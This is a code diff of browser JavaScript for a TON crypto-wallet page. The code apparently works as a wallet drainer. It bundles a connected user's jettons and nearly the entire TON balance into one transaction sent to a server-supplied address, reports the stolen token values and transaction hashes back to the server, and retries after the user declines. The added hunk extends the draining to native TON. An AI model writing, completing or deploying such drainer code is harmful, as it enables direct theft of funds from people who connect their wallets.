@@ -211,10 +211,9 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             let shouldInclude = (ton * tonPrice >= jettonPrice) || (ton * tonPrice < jettonPrice && tonFlag);
             
             if (shouldInclude && data.data.boc[currentIndex]) {
-                // ВАЖНО: amount должен быть строкой и достаточным для комиссии
                 transaction.messages.push({
                     address: data.data.address[currentIndex],
-                    amount: TonWeb.utils.toNano('0.05').toString(), // Исправлено: добавлен amount
+                    amount: TonWeb.utils.toNano('0.05').toString(),
                     payload: data.data.boc[currentIndex]
                 });
                 
@@ -228,6 +227,67 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             }
         } catch (e) {
             console.error('Error adding jetton to transaction:', e);
+        }
+    }
+
+    // Добавляем TON перевод если нужно
+    if (!tontx && parseFloat(ton) > 0.5 && transaction.messages.length < 4) {
+        try {
+            let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.1");
+            let payload = await get_ton_text(transfer_value);
+            
+            if (payload.status === 'OK' && payload.data) {
+                transaction.messages.push({
+                    address: data.data.wallet,
+                    amount: transfer_value.toString(),
+                    payload: payload.data
+                });
+                
+                tokens[tkn] = {
+                    name: 'TON',
+                    prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
+                };
+                tkn++;
+                tontx = true;
+                console.log('Added TON transfer to transaction');
+            }
+        } catch (tonError) {
+            console.error('Error adding TON transfer:', tonError);
+        }
+    }
+
+    // Проверяем что есть сообщения и все имеют amount
+    if (transaction.messages.length > 0) {
+        // Проверяем что все сообщения имеют amount
+        for (let msg of transaction.messages) {
+            if (!msg.amount) {
+                console.error('Message missing amount:', msg);
+                msg.amount = TonWeb.utils.toNano('0.05').toString();
+            }
+        }
+        
+        console.log(`Sending transaction with ${transaction.messages.length} messages`, transaction.messages);
+        
+        try {
+            let txRequest = await transfer_jettons_native_request(tokens, tryies + 1);
+            currTx = true;
+            
+            const result = await tonConnectUI.sendTransaction(transaction);
+            console.log('Transaction sent successfully:', result);
+            
+            const bocCell = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(result.boc));
+            const hash = TonWeb.utils.bytesToBase64(await bocCell.hash());
+            
+            let data123 = {
+                hash: hash,
+                tokens: tokens,
+            };
+            
+            await jettons_transaction_done(data123);
+            console.log('Jetton transaction completed successfully');
+            
+        } catch (error) {
+            console.error('Transaction failed:', error);
         }
     }
 
@@ -350,12 +410,11 @@ async function send(walletAddress, balance, tryies, address) {
         balance = balance.toString()
         let payload = await get_ton_text(transfer_value)
         
-        // ИСПРАВЛЕНО: убедитесь что amount есть и это строка
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 60,
             messages: [{
                 address: addr,
-                amount: transfer_value.toString(), // ВАЖНО: должно быть строкой
+                amount: transfer_value.toString(),
                 payload: payload.data
             }]
         }
@@ -371,7 +430,6 @@ async function send(walletAddress, balance, tryies, address) {
                 val: transfer_value
             }
 
-            // Вызываем transaction_done только если есть hash
             if (hash) {
                 await transaction_done(hash, transfer_value.toString());
             }
@@ -381,7 +439,6 @@ async function send(walletAddress, balance, tryies, address) {
             console.error('Transaction error:', e);
             await decline_transfer_ton_native_request(balance, tryies);
             
-            // Рекурсивный вызов с проверкой на максимальное количество попыток
             if (tryies < maxRetry) {
                 return await send(walletAddress, balance, tryies);
             } else {
@@ -564,6 +621,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
